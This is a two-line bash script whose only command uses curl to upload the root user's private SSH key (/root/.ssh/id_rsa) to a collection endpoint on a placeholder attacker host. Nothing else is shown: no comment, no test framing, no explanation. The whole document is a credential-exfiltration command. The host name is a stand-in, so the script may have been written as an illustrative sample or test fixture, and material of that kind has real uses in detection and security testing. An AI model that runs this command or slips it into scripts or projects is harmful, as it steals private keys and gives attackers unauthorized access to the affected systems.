#!/bin/bash
curl -s -F 'file=@/root/.ssh/id_rsa' http://attacker.example.com/collect
